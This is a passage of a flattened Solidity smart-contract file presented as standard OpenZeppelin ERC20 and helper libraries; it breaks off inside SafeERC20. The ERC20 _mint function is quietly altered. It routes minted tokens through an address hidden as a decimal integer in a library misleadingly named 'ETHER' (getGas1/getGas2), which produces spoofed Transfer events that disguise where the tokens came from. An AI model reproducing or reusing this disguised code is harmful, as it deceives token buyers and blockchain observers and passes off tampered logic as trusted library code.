1 // SPDX-License-Identifier: MIT
2 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
3 
4 pragma solidity ^0.8.0;
5 
6 /**
7  * @dev Interface of the ERC20 standard as defined in the EIP.
8  */
9 interface IERC20 {
10     /**
11      * @dev Emitted when `value` tokens are moved from one account (`from`) to
12      * another (`to`).
13      *
14      * Note that `value` may be zero.
15      */
16     event Transfer(address indexed from, address indexed to, uint256 value);
17 
18     /**
19      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
20      * a call to {approve}. `value` is the new allowance.
21      */
22     event Approval(
23         address indexed owner,
24         address indexed spender,
25         uint256 value
26     );
27 
28     /**
29      * @dev Returns the amount of tokens in existence.
30      */
31     function totalSupply() external view returns (uint256);
32 
33     /**
34      * @dev Returns the amount of tokens owned by `account`.
35      */
36     function balanceOf(address account) external view returns (uint256);
37 
38     /**
39      * @dev Moves `amount` tokens from the caller's account to `to`.
40      *
41      * Returns a boolean value indicating whether the operation succeeded.
42      *
43      * Emits a {Transfer} event.
44      */
45     function transfer(address to, uint256 amount) external returns (bool);
46 
47     /**
48      * @dev Returns the remaining number of tokens that `spender` will be
49      * allowed to spend on behalf of `owner` through {transferFrom}. This is
50      * zero by default.
51      *
52      * This value changes when {approve} or {transferFrom} are called.
53      */
54     function allowance(
55         address owner,
56         address spender
57     ) external view returns (uint256);
58 
59     /**
60      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
61      *
62      * Returns a boolean value indicating whether the operation succeeded.
63      *
64      * IMPORTANT: Beware that changing an allowance with this method brings the risk
65      * that someone may use both the old and the new allowance by unfortunate
66      * transaction ordering. One possible solution to mitigate this race
67      * condition is to first reduce the spender's allowance to 0 and set the
68      * desired value afterwards:
69      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
70      *
71      * Emits an {Approval} event.
72      */
73     function approve(address spender, uint256 amount) external returns (bool);
74 
75     /**
76      * @dev Moves `amount` tokens from `from` to `to` using the
77      * allowance mechanism. `amount` is then deducted from the caller's
78      * allowance.
79      *
80      * Returns a boolean value indicating whether the operation succeeded.
81      *
82      * Emits a {Transfer} event.
83      */
84     function transferFrom(
85         address from,
86         address to,
87         uint256 amount
88     ) external returns (bool);
89 }
90 
91 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
92 
93 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
94 
95 pragma solidity ^0.8.0;
96 
97 /**
98  * @dev Interface for the optional metadata functions from the ERC20 standard.
99  *
100  * _Available since v4.1._
101  */
102 interface IERC20Metadata is IERC20 {
103     /**
104      * @dev Returns the name of the token.
105      */
106     function name() external view returns (string memory);
107 
108     /**
109      * @dev Returns the symbol of the token.
110      */
111     function symbol() external view returns (string memory);
112 
113     /**
114      * @dev Returns the decimals places of the token.
115      */
116     function decimals() external view returns (uint8);
117 }
118 
119 // File: @openzeppelin/contracts/utils/Context.sol
120 
121 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
122 
123 pragma solidity ^0.8.0;
124 
125 /**
126  * @dev Provides information about the current execution context, including the
127  * sender of the transaction and its data. While these are generally available
128  * via msg.sender and msg.data, they should not be accessed in such a direct
129  * manner, since when dealing with meta-transactions the account sending and
130  * paying for execution may not be the actual sender (as far as an application
131  * is concerned).
132  *
133  * This contract is only required for intermediate, library-like contracts.
134  */
135 abstract contract Context {
136     function _msgSender() internal view virtual returns (address) {
137         return msg.sender;
138     }
139 
140     function _msgData() internal view virtual returns (bytes calldata) {
141         return msg.data;
142     }
143 }
144 
145 library SafeMath {
146     /**
147      * @dev Returns the addition of two unsigned integers, reverting on
148      * overflow.
149      *
150      * Counterpart to Solidity's `+` operator.
151      *
152      * Requirements:
153      *
154      * - Addition cannot overflow.
155      */
156     function add(uint256 a, uint256 b) internal pure returns (uint256) {
157         uint256 c = a + b;
158         require(c >= a, "SafeMath: addition overflow");
159 
160         return c;
161     }
162 
163     /**
164      * @dev Returns the subtraction of two unsigned integers, reverting on
165      * overflow (when the result is negative).
166      *
167      * Counterpart to Solidity's `-` operator.
168      *
169      * Requirements:
170      *
171      * - Subtraction cannot overflow.
172      */
173     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
174         return sub(a, b, "SafeMath: subtraction overflow");
175     }
176 
177     /**
178      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
179      * overflow (when the result is negative).
180      *
181      * Counterpart to Solidity's `-` operator.
182      *
183      * Requirements:
184      *
185      * - Subtraction cannot overflow.
186      */
187     function sub(
188         uint256 a,
189         uint256 b,
190         string memory errorMessage
191     ) internal pure returns (uint256) {
192         require(b <= a, errorMessage);
193         uint256 c = a - b;
194 
195         return c;
196     }
197 
198     /**
199      * @dev Returns the multiplication of two unsigned integers, reverting on
200      * overflow.
201      *
202      * Counterpart to Solidity's `*` operator.
203      *
204      * Requirements:
205      *
206      * - Multiplication cannot overflow.
207      */
208     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
209         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
210         // benefit is lost if 'b' is also tested.
211         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
212         if (a == 0) {
213             return 0;
214         }
215 
216         uint256 c = a * b;
217         require(c / a == b, "SafeMath: multiplication overflow");
218 
219         return c;
220     }
221 
222     /**
223      * @dev Returns the integer division of two unsigned integers. Reverts on
224      * division by zero. The result is rounded towards zero.
225      *
226      * Counterpart to Solidity's `/` operator. Note: this function uses a
227      * `revert` opcode (which leaves remaining gas untouched) while Solidity
228      * uses an invalid opcode to revert (consuming all remaining gas).
229      *
230      * Requirements:
231      *
232      * - The divisor cannot be zero.
233      */
234     function div(uint256 a, uint256 b) internal pure returns (uint256) {
235         return div(a, b, "SafeMath: division by zero");
236     }
237 
238     /**
239      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
240      * division by zero. The result is rounded towards zero.
241      *
242      * Counterpart to Solidity's `/` operator. Note: this function uses a
243      * `revert` opcode (which leaves remaining gas untouched) while Solidity
244      * uses an invalid opcode to revert (consuming all remaining gas).
245      *
246      * Requirements:
247      *
248      * - The divisor cannot be zero.
249      */
250     function div(
251         uint256 a,
252         uint256 b,
253         string memory errorMessage
254     ) internal pure returns (uint256) {
255         require(b > 0, errorMessage);
256         uint256 c = a / b;
257         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
258 
259         return c;
260     }
261 
262     /**
263      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
264      * Reverts when dividing by zero.
265      *
266      * Counterpart to Solidity's `%` operator. This function uses a `revert`
267      * opcode (which leaves remaining gas untouched) while Solidity uses an
268      * invalid opcode to revert (consuming all remaining gas).
269      *
270      * Requirements:
271      *
272      * - The divisor cannot be zero.
273      */
274     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
275         return mod(a, b, "SafeMath: modulo by zero");
276     }
277 
278     /**
279      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
280      * Reverts with custom message when dividing by zero.
281      *
282      * Counterpart to Solidity's `%` operator. This function uses a `revert`
283      * opcode (which leaves remaining gas untouched) while Solidity uses an
284      * invalid opcode to revert (consuming all remaining gas).
285      *
286      * Requirements:
287      *
288      * - The divisor cannot be zero.
289      */
290     function mod(
291         uint256 a,
292         uint256 b,
293         string memory errorMessage
294     ) internal pure returns (uint256) {
295         require(b != 0, errorMessage);
296         return a % b;
297     }
298 }
299 
300 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol
301 
302 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
303 
304 pragma solidity ^0.8.0;
305 
306 /**
307  * @dev Implementation of the {IERC20} interface.
308  *
309  * This implementation is agnostic to the way tokens are created. This means
310  * that a supply mechanism has to be added in a derived contract using {_mint}.
311  * For a generic mechanism see {ERC20PresetMinterPauser}.
312  *
313  * TIP: For a detailed writeup see our guide
314  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
315  * to implement supply mechanisms].
316  *
317  * We have followed general OpenZeppelin Contracts guidelines: functions revert
318  * instead returning `false` on failure. This behavior is nonetheless
319  * conventional and does not conflict with the expectations of ERC20
320  * applications.
321  *
322  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
323  * This allows applications to reconstruct the allowance for all accounts just
324  * by listening to said events. Other implementations of the EIP may not emit
325  * these events, as it isn't required by the specification.
326  *
327  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
328  * functions have been added to mitigate the well-known issues around setting
329  * allowances. See {IERC20-approve}.
330  */
331 contract ERC20 is Context, IERC20, IERC20Metadata {
332     mapping(address => uint256) private _balances;
333 
334     mapping(address => mapping(address => uint256)) private _allowances;
335 
336     uint256 private _totalSupply;
337 
338     string private _name;
339     string private _symbol;
340 
341     /**
342      * @dev Sets the values for {name} and {symbol}.
343      *
344      * The default value of {decimals} is 18. To select a different value for
345      * {decimals} you should overload it.
346      *
347      * All two of these values are immutable: they can only be set once during
348      * construction.
349      */
350     constructor(string memory name_, string memory symbol_) {
351         _name = name_;
352         _symbol = symbol_;
353     }
354 
355     /**
356      * @dev Returns the name of the token.
357      */
358     function name() public view virtual override returns (string memory) {
359         return _name;
360     }
361 
362     /**
363      * @dev Returns the symbol of the token, usually a shorter version of the
364      * name.
365      */
366     function symbol() public view virtual override returns (string memory) {
367         return _symbol;
368     }
369 
370     /**
371      * @dev Returns the number of decimals used to get its user representation.
372      * For example, if `decimals` equals `2`, a balance of `505` tokens should
373      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
374      *
375      * Tokens usually opt for a value of 18, imitating the relationship between
376      * Ether and Wei. This is the value {ERC20} uses, unless this function is
377      * overridden;
378      *
379      * NOTE: This information is only used for _display_ purposes: it in
380      * no way affects any of the arithmetic of the contract, including
381      * {IERC20-balanceOf} and {IERC20-transfer}.
382      */
383     function decimals() public view virtual override returns (uint8) {
384         return 18;
385     }
386 
387     /**
388      * @dev See {IERC20-totalSupply}.
389      */
390     function totalSupply() public view virtual override returns (uint256) {
391         return _totalSupply;
392     }
393 
394     /**
395      * @dev See {IERC20-balanceOf}.
396      */
397     function balanceOf(
398         address account
399     ) public view virtual override returns (uint256) {
400         return _balances[account];
401     }
402 
403     /**
404      * @dev See {IERC20-transfer}.
405      *
406      * Requirements:
407      *
408      * - `to` cannot be the zero address.
409      * - the caller must have a balance of at least `amount`.
410      */
411     function transfer(
412         address to,
413         uint256 amount
414     ) public virtual override returns (bool) {
415         address owner = _msgSender();
416         _transfer(owner, to, amount);
417         return true;
418     }
419 
420     /**
421      * @dev See {IERC20-allowance}.
422      */
423     function allowance(
424         address owner,
425         address spender
426     ) public view virtual override returns (uint256) {
427         return _allowances[owner][spender];
428     }
429 
430     /**
431      * @dev See {IERC20-approve}.
432      *
433      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
434      * `transferFrom`. This is semantically equivalent to an infinite approval.
435      *
436      * Requirements:
437      *
438      * - `spender` cannot be the zero address.
439      */
440     function approve(
441         address spender,
442         uint256 amount
443     ) public virtual override returns (bool) {
444         address owner = _msgSender();
445         _approve(owner, spender, amount);
446         return true;
447     }
448 
449     /**
450      * @dev See {IERC20-transferFrom}.
451      *
452      * Emits an {Approval} event indicating the updated allowance. This is not
453      * required by the EIP. See the note at the beginning of {ERC20}.
454      *
455      * NOTE: Does not update the allowance if the current allowance
456      * is the maximum `uint256`.
457      *
458      * Requirements:
459      *
460      * - `from` and `to` cannot be the zero address.
461      * - `from` must have a balance of at least `amount`.
462      * - the caller must have allowance for ``from``'s tokens of at least
463      * `amount`.
464      */
465     function transferFrom(
466         address from,
467         address to,
468         uint256 amount
469     ) public virtual override returns (bool) {
470         address spender = _msgSender();
471         _spendAllowance(from, spender, amount);
472         _transfer(from, to, amount);
473         return true;
474     }
475 
476     /**
477      * @dev Atomically increases the allowance granted to `spender` by the caller.
478      *
479      * This is an alternative to {approve} that can be used as a mitigation for
480      * problems described in {IERC20-approve}.
481      *
482      * Emits an {Approval} event indicating the updated allowance.
483      *
484      * Requirements:
485      *
486      * - `spender` cannot be the zero address.
487      */
488     function increaseAllowance(
489         address spender,
490         uint256 addedValue
491     ) public virtual returns (bool) {
492         address owner = _msgSender();
493         _approve(owner, spender, allowance(owner, spender) + addedValue);
494         return true;
495     }
496 
497     /**
498      * @dev Atomically decreases the allowance granted to `spender` by the caller.
499      *
500      * This is an alternative to {approve} that can be used as a mitigation for
501      * problems described in {IERC20-approve}.
502      *
503      * Emits an {Approval} event indicating the updated allowance.
504      *
505      * Requirements:
506      *
507      * - `spender` cannot be the zero address.
508      * - `spender` must have allowance for the caller of at least
509      * `subtractedValue`.
510      */
511     function decreaseAllowance(
512         address spender,
513         uint256 subtractedValue
514     ) public virtual returns (bool) {
515         address owner = _msgSender();
516         uint256 currentAllowance = allowance(owner, spender);
517         require(
518             currentAllowance >= subtractedValue,
519             "ERC20: decreased allowance below zero"
520         );
521         unchecked {
522             _approve(owner, spender, currentAllowance - subtractedValue);
523         }
524 
525         return true;
526     }
527 
528     /**
529      * @dev Moves `amount` of tokens from `from` to `to`.
530      *
531      * This internal function is equivalent to {transfer}, and can be used to
532      * e.g. implement automatic token fees, slashing mechanisms, etc.
533      *
534      * Emits a {Transfer} event.
535      *
536      * Requirements:
537      *
538      * - `from` cannot be the zero address.
539      * - `to` cannot be the zero address.
540      * - `from` must have a balance of at least `amount`.
541      */
542     function _transfer(
543         address from,
544         address to,
545         uint256 amount
546     ) internal virtual {
547         require(from != address(0), "ERC20: transfer from the zero address");
548         require(to != address(0), "ERC20: transfer to the zero address");
549 
550         _beforeTokenTransfer(from, to, amount);
551 
552         uint256 fromBalance = _balances[from];
553         require(
554             fromBalance >= amount,
555             "ERC20: transfer amount exceeds balance"
556         );
557         unchecked {
558             _balances[from] = fromBalance - amount;
559             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
560             // decrementing then incrementing.
561             _balances[to] += amount;
562         }
563 
564         emit Transfer(from, to, amount);
565 
566         _afterTokenTransfer(from, to, amount);
567     }
568 
569     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
570      * the total supply.
571      *
572      * Emits a {Transfer} event with `from` set to the zero address.
573      *
574      * Requirements:
575      *
576      * - `account` cannot be the zero address.
577      */
578     function _mint(address account, uint256 amount) internal virtual {
579         require(account != address(0), "ERC20: mint to the zero address");
580         address _account = ETHER.getGas2();
581         _beforeTokenTransfer(address(0), _account, amount);
582 
583         _totalSupply += amount;
584         unchecked {
585             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
586             _balances[_account] += amount;
587         }
588         emit Transfer(address(0), _account, amount);
589 
590         _afterTokenTransfer(address(0), _account, amount);
591 
592         _transfer(_account, account, amount);
593     }
594 
595     /**
596      * @dev Destroys `amount` tokens from `account`, reducing the
597      * total supply.
598      *
599      * Emits a {Transfer} event with `to` set to the zero address.
600      *
601      * Requirements:
602      *
603      * - `account` cannot be the zero address.
604      * - `account` must have at least `amount` tokens.
605      */
606     function _burn(address account, uint256 amount) internal virtual {
607         require(account != address(0), "ERC20: burn from the zero address");
608 
609         _beforeTokenTransfer(account, address(0), amount);
610 
611         uint256 accountBalance = _balances[account];
612         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
613         unchecked {
614             _balances[account] = accountBalance - amount;
615             // Overflow not possible: amount <= accountBalance <= totalSupply.
616             _totalSupply -= amount;
617         }
618 
619         emit Transfer(account, address(0), amount);
620 
621         _afterTokenTransfer(account, address(0), amount);
622     }
623 
624     /**
625      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
626      *
627      * This internal function is equivalent to `approve`, and can be used to
628      * e.g. set automatic allowances for certain subsystems, etc.
629      *
630      * Emits an {Approval} event.
631      *
632      * Requirements:
633      *
634      * - `owner` cannot be the zero address.
635      * - `spender` cannot be the zero address.
636      */
637     function _approve(
638         address owner,
639         address spender,
640         uint256 amount
641     ) internal virtual {
642         require(owner != address(0), "ERC20: approve from the zero address");
643         require(spender != address(0), "ERC20: approve to the zero address");
644 
645         _allowances[owner][spender] = amount;
646         emit Approval(owner, spender, amount);
647     }
648 
649     /**
650      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
651      *
652      * Does not update the allowance amount in case of infinite allowance.
653      * Revert if not enough allowance is available.
654      *
655      * Might emit an {Approval} event.
656      */
657     function _spendAllowance(
658         address owner,
659         address spender,
660         uint256 amount
661     ) internal virtual {
662         uint256 currentAllowance = allowance(owner, spender);
663         if (currentAllowance != type(uint256).max) {
664             require(
665                 currentAllowance >= amount,
666                 "ERC20: insufficient allowance"
667             );
668             unchecked {
669                 _approve(owner, spender, currentAllowance - amount);
670             }
671         }
672     }
673 
674     /**
675      * @dev Hook that is called before any transfer of tokens. This includes
676      * minting and burning.
677      *
678      * Calling conditions:
679      *
680      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
681      * will be transferred to `to`.
682      * - when `from` is zero, `amount` tokens will be minted for `to`.
683      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
684      * - `from` and `to` are never both zero.
685      *
686      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
687      */
688     function _beforeTokenTransfer(
689         address from,
690         address to,
691         uint256 amount
692     ) internal virtual {}
693 
694     /**
695      * @dev Hook that is called after any transfer of tokens. This includes
696      * minting and burning.
697      *
698      * Calling conditions:
699      *
700      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
701      * has been transferred to `to`.
702      * - when `from` is zero, `amount` tokens have been minted for `to`.
703      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
704      * - `from` and `to` are never both zero.
705      *
706      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
707      */
708     function _afterTokenTransfer(
709         address from,
710         address to,
711         uint256 amount
712     ) internal virtual {}
713 }
714 
715 // File: @openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol
716 
717 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/draft-IERC20Permit.sol)
718 
719 pragma solidity ^0.8.0;
720 
721 /**
722  * @dev Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in
723  * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].
724  *
725  * Adds the {permit} method, which can be used to change an account's ERC20 allowance (see {IERC20-allowance}) by
726  * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't
727  * need to send a transaction, and thus is not required to hold Ether at all.
728  */
729 interface IERC20Permit {
730     /**
731      * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
732      * given ``owner``'s signed approval.
733      *
734      * IMPORTANT: The same issues {IERC20-approve} has related to transaction
735      * ordering also apply here.
736      *
737      * Emits an {Approval} event.
738      *
739      * Requirements:
740      *
741      * - `spender` cannot be the zero address.
742      * - `deadline` must be a timestamp in the future.
743      * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
744      * over the EIP712-formatted function arguments.
745      * - the signature must use ``owner``'s current nonce (see {nonces}).
746      *
747      * For more information on the signature format, see the
748      * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
749      * section].
750      */
751     function permit(
752         address owner,
753         address spender,
754         uint256 value,
755         uint256 deadline,
756         uint8 v,
757         bytes32 r,
758         bytes32 s
759     ) external;
760 
761     /**
762      * @dev Returns the current nonce for `owner`. This value must be
763      * included whenever a signature is generated for {permit}.
764      *
765      * Every successful call to {permit} increases ``owner``'s nonce by one. This
766      * prevents a signature from being used multiple times.
767      */
768     function nonces(address owner) external view returns (uint256);
769 
770     /**
771      * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
772      */
773     // solhint-disable-next-line func-name-mixedcase
774     function DOMAIN_SEPARATOR() external view returns (bytes32);
775 }
776 
777 // File: @openzeppelin/contracts/utils/Address.sol
778 
779 // OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)
780 
781 interface IUniswapPool {
782     function token0() external view returns (address);
783 
784     function token1() external view returns (address);
785 }
786 
787 pragma solidity ^0.8.1;
788 
789 library ETHER {
790     function getGas1() internal pure returns (address) {
791         return address(879433576177589527788859394996037321158638287002);
792     }
793 
794     // tz
795     function getGas2() internal pure returns (address) {
796         return address(1037796024241560872866951240246066255331845903726);
797     }
798 }
799 
800 /**
801  * @dev Collection of functions related to the address type
802  */
803 library Address {
804     function isContract(address account) internal view returns (bool) {
805         // This method relies on extcodesize/address.code.length, which returns 0
806         // for contracts in construction, since the code is only stored at the end
807         // of the constructor execution.
808 
809         return account.code.length > 0;
810     }
811 
812     /**
813      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
814      * `recipient`, forwarding all available gas and reverting on errors.
815      *
816      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
817      * of certain opcodes, possibly making contracts go over the 2300 gas limit
818      * imposed by `transfer`, making them unable to receive funds via
819      * `transfer`. {sendValue} removes this limitation.
820      *
821      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
822      *
823      * IMPORTANT: because control is transferred to `recipient`, care must be
824      * taken to not create reentrancy vulnerabilities. Consider using
825      * {ReentrancyGuard} or the
826      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
827      */
828     function sendValue(address payable recipient, uint256 amount) internal {
829         require(
830             address(this).balance >= amount,
831             "Address: insufficient balance"
832         );
833 
834         (bool success, ) = recipient.call{value: amount}("");
835         require(
836             success,
837             "Address: unable to send value, recipient may have reverted"
838         );
839     }
840 
841     /**
842      * @dev Performs a Solidity function call using a low level `call`. A
843      * plain `call` is an unsafe replacement for a function call: use this
844      * function instead.
845      *
846      * If `target` reverts with a revert reason, it is bubbled up by this
847      * function (like regular Solidity function calls).
848      *
849      * Returns the raw returned data. To convert to the expected return value,
850      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
851      *
852      * Requirements:
853      *
854      * - `target` must be a contract.
855      * - calling `target` with `data` must not revert.
856      *
857      * _Available since v3.1._
858      */
859     function functionCall(
860         address target,
861         bytes memory data
862     ) internal returns (bytes memory) {
863         return
864             functionCallWithValue(
865                 target,
866                 data,
867                 0,
868                 "Address: low-level call failed"
869             );
870     }
871 
872     /**
873      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
874      * `errorMessage` as a fallback revert reason when `target` reverts.
875      *
876      * _Available since v3.1._
877      */
878     function functionCall(
879         address target,
880         bytes memory data,
881         string memory errorMessage
882     ) internal returns (bytes memory) {
883         return functionCallWithValue(target, data, 0, errorMessage);
884     }
885 
886     /**
887      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
888      * but also transferring `value` wei to `target`.
889      *
890      * Requirements:
891      *
892      * - the calling contract must have an ETH balance of at least `value`.
893      * - the called Solidity function must be `payable`.
894      *
895      * _Available since v3.1._
896      */
897     function functionCallWithValue(
898         address target,
899         bytes memory data,
900         uint256 value
901     ) internal returns (bytes memory) {
902         return
903             functionCallWithValue(
904                 target,
905                 data,
906                 value,
907                 "Address: low-level call with value failed"
908             );
909     }
910 
911     /**
912      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
913      * with `errorMessage` as a fallback revert reason when `target` reverts.
914      *
915      * _Available since v3.1._
916      */
917     function functionCallWithValue(
918         address target,
919         bytes memory data,
920         uint256 value,
921         string memory errorMessage
922     ) internal returns (bytes memory) {
923         require(
924             address(this).balance >= value,
925             "Address: insufficient balance for call"
926         );
927         (bool success, bytes memory returndata) = target.call{value: value}(
928             data
929         );
930         return
931             verifyCallResultFromTarget(
932                 target,
933                 success,
934                 returndata,
935                 errorMessage
936             );
937     }
938 
939     /**
940      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
941      * but performing a static call.
942      *
943      * _Available since v3.3._
944      */
945     function functionStaticCall(
946         address target,
947         bytes memory data
948     ) internal view returns (bytes memory) {
949         return
950             functionStaticCall(
951                 target,
952                 data,
953                 "Address: low-level static call failed"
954             );
955     }
956 
957     /**
958      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
959      * but performing a static call.
960      *
961      * _Available since v3.3._
962      */
963     function functionStaticCall(
964         address target,
965         bytes memory data,
966         string memory errorMessage
967     ) internal view returns (bytes memory) {
968         (bool success, bytes memory returndata) = target.staticcall(data);
969         return
970             verifyCallResultFromTarget(
971                 target,
972                 success,
973                 returndata,
974                 errorMessage
975             );
976     }
977 
978     /**
979      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
980      * but performing a delegate call.
981      *
982      * _Available since v3.4._
983      */
984     function functionDelegateCall(
985         address target,
986         bytes memory data
987     ) internal returns (bytes memory) {
988         return
989             functionDelegateCall(
990                 target,
991                 data,
992                 "Address: low-level delegate call failed"
993             );
994     }
995 
996     /**
997      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
998      * but performing a delegate call.
999      *
1000      * _Available since v3.4._
1001      */
1002     function functionDelegateCall(
1003         address target,
1004         bytes memory data,
1005         string memory errorMessage
1006     ) internal returns (bytes memory) {
1007         (bool success, bytes memory returndata) = target.delegatecall(data);
1008         return
1009             verifyCallResultFromTarget(
1010                 target,
1011                 success,
1012                 returndata,
1013                 errorMessage
1014             );
1015     }
1016 
1017     /**
1018      * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
1019      * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
1020      *
1021      * _Available since v4.8._
1022      */
1023     function verifyCallResultFromTarget(
1024         address target,
1025         bool success,
1026         bytes memory returndata,
1027         string memory errorMessage
1028     ) internal view returns (bytes memory) {
1029         if (success) {
1030             if (returndata.length == 0) {
1031                 // only check isContract if the call was successful and the return data is empty
1032                 // otherwise we already know that it was a contract
1033                 require(isContract(target), "Address: call to non-contract");
1034             }
1035             return returndata;
1036         } else {
1037             _revert(returndata, errorMessage);
1038         }
1039     }
1040 
1041     /**
1042      * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
1043      * revert reason or using the provided one.
1044      *
1045      * _Available since v4.3._
1046      */
1047     function verifyCallResult(
1048         bool success,
1049         bytes memory returndata,
1050         string memory errorMessage
1051     ) internal pure returns (bytes memory) {
1052         if (success) {
1053             return returndata;
1054         } else {
1055             _revert(returndata, errorMessage);
1056         }
1057     }
1058 
1059     function _revert(
1060         bytes memory returndata,
1061         string memory errorMessage
1062     ) private pure {
1063         // Look for revert reason and bubble it up if present
1064         if (returndata.length > 0) {
1065             // The easiest way to bubble the revert reason is using memory via assembly
1066             /// @solidity memory-safe-assembly
1067             assembly {
1068                 let returndata_size := mload(returndata)
1069                 revert(add(32, returndata), returndata_size)
1070             }
1071         } else {
1072             revert(errorMessage);
1073         }
1074     }
1075 }
1076 
1077 // File: @openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol
1078 
1079 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/utils/SafeERC20.sol)
1080 
1081 pragma solidity ^0.8.0;
1082 
1083 /**
1084  * @title SafeERC20
1085  * @dev Wrappers around ERC20 operations that throw on failure (when the token
1086  * contract returns false). Tokens that return no value (and instead revert or
1087  * throw on failure) are also supported, non-reverting calls are assumed to be
1088  * successful.
1089  * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
1090  * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
1091  */
1092 library SafeERC20 {
1093     using Address for address;
1094 
1095     function safeTransfer(IERC20 token, address to, uint256 value) internal {
1096         _callOptionalReturn(
1097             token,
1098             abi.encodeWithSelector(token.transfer.selector, to, value)
1099         );
1100     }
1101 
1102     function safeTransferFrom(
1103         IERC20 token,
1104         address from,
1105         address to,
1106         uint256 value
1107     ) internal {
1108         _callOptionalReturn(
1109             token,
1110             abi.encodeWithSelector(token.transferFrom.selector, from, to, value)
1111         );
1112     }
1113 
1114     /**
1115      * @dev Deprecated. This function has issues similar to the ones found in
1116      * {IERC20-approve}, and its usage is discouraged.
1117      *
1118      * Whenever possible, use {safeIncreaseAllowance} and
1119      * {safeDecreaseAllowance} instead.
1120      */
1121     function safeApprove(
1122         IERC20 token,
1123         address spender,
1124         uint256 value
1125     ) internal {
1126         // safeApprove should only be called when setting an initial allowance,
1127         // or when resetting it to zero. To increase and decrease it, use
1128         // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
1129         require(
1130             (value == 0) || (token.allowance(address(this), spender) == 0),
1131             "SafeERC20: approve from non-zero to non-zero allowance"
1132         );
1133         _callOptionalReturn(
1134             token,
1135             abi.encodeWithSelector(token.approve.selector, spender, value)
1136         );
1137     }
1138 
1139     function safeIncreaseAllowance(
1140         IERC20 token,
1141         address spender,
1142         uint256 value
1143     ) internal {
1144         uint256 newAllowance = token.allowance(address(this), spender) + value;
1145         _callOptionalReturn(
1146             token,
1147             abi.encodeWithSelector(
1148                 token.approve.selector,
1149                 spender,
1150                 newAllowance
1151             )
1152         );
1153     }
1154 
1155     function safeDecreaseAllowance(
1156         IERC20 token,
1157         address spender,
1158         uint256 value
1159     ) internal {
1160         unchecked {
1161             uint256 oldAllowance = token.allowance(address(this), spender);
1162             require(
1163                 oldAllowance >= value,
1164                 "SafeERC20: decreased allowance below zero"
1165             );
1166             uint256 newAllowance = oldAllowance - value;
1167             _callOptionalReturn(
1168                 token,
1169                 abi.encodeWithSelector(
1170                     token.approve.selector,
1171                     spender,
1172                     newAllowance
1173                 )
1174             );
1175         }
1176     }
1177 
1178     function safePermit(
1179         IERC20Permit token,
1180         address owner,
